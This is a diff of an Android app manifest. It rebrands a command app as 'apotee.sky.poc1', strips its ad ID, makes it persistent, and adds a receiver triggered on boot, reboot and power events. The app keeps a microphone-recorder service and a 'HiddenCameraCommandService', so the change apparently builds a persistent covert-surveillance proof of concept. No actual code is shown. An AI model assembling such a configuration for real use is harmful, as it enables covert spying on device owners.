@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
-    package="net.kwatts.android.droidcommandpro">
+    package="apotee.sky.poc1">
 
 
     <!-- NORMAL -->
@@ -10,6 +10,8 @@
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.VIBRATE" />
+
+
     <!--
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
@@ -108,14 +110,12 @@
     -->
 
     <application
-        android:name=".App"
+        android:name="apotee.sky.poc1.App"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
+        android:persistent="true"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar.FullScreen">
-        <meta-data
-            android:name="com.google.android.gms.ads.APPLICATION_ID"
-            android:value="ca-app-pub-2189980367471582~1443964910" />
         <!--
         <activity android:name=".MainActivity" android:label="@string/app_name">
             <intent-filter>
@@ -126,7 +126,7 @@
 
 
         <activity
-            android:name=".MainActivity"
+            android:name="apotee.sky.poc1.MainActivity"
             android:label="@string/app_name"
             android:supportsRtl="true">
             <intent-filter>
@@ -135,30 +135,45 @@
             </intent-filter>
         </activity>
 
-        <receiver android:name="net.kwatts.android.droidcommandpro.ApiReceiver" />
+        <receiver android:name="apotee.sky.poc1.ApiReceiver">
+        <intent-filter>
+            <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+            <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+            <action android:name="android.intent.action.REBOOT" />
+            <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+        </intent-filter>
+        </receiver>
 
         <activity
-            android:name="net.kwatts.android.droidcommandpro.commands.CommandDialog"
+            android:name="apotee.sky.poc1.commands.CommandDialog"
             android:excludeFromRecents="true"
             android:exported="false"
             android:noHistory="true"
             android:theme="@style/DialogTheme" />
         <activity
-            android:name="net.kwatts.android.droidcommandpro.ApiPermissionActivity"
+            android:name="apotee.sky.poc1.ApiPermissionActivity"
             android:excludeFromRecents="true"
             android:exported="false"
             android:noHistory="true"
             android:theme="@android:style/Theme.NoDisplay" />
 
         <service
-            android:name=".commands.CommandMicrophoneRecorder$MicRecorderService"
+            android:name="apotee.sky.poc1.commands.CommandMicrophoneRecorder$MicRecorderService"
             android:exported="false" />
         <service
-            android:name=".commands.CommandCamera$HiddenCameraCommandService"
+            android:name="apotee.sky.poc1.commands.CommandCamera$HiddenCameraCommandService"
             android:exported="false" />
 
-        <activity android:name="net.kwatts.android.droidcommandpro.SettingsActivity" />
+        <activity android:name="apotee.sky.poc1.SettingsActivity" />
 
     </application>
+    <!-- android.intent.action.ACTION_SHUTDOWN
+    android.intent.action.REBOOT
+    android.intent.action.USER_UNLOCKED
+    android.os.action.DEVICE_IDLE_MODE_CHANGED
+    android.os.action.POWER_SAVE_MODE_CHANGED
+
+    -->
 
 </manifest>
